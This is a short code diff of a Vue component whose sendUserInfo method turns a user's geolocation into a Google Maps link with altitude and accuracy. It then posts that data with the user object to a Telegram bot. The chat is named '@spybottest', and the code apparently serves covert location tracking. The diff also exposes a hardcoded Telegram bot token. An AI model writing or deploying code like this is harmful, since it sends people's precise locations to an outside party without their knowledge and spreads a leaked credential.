@@ -16,15 +16,26 @@ import axios from "axios";
 export default {
   methods: {
     async sendUserInfo(user, data) {
-      const info = {
-        user: user,
-        location: data,
-      };
+      let info = [];
+      if (data) {
+        const link = `https://maps.google.com/?q=${data.coords.latitude},${data.coords.longitude}`;
+        info = {
+          user: user,
+          location: link,
+          altitude: data.coords.altitude,
+          accuracy: data.coords.accuracy,
+        };
+      } else {
+        info = {
+          user: user,
+          location: null,
+        };
+      }
+
       const response = await axios.post(
         "https://api.telegram.org/bot5637853805:AAFXbflITHKv9rqrGGjh7uDBW7WL-SW7k7I/sendMessage?chat_id=@spybottest&text=" +
           JSON.stringify(info)
       );
-      console.log(response);
     },
     cloneAsObject(obj) {
       if (obj === null || !(obj instanceof Object)) {
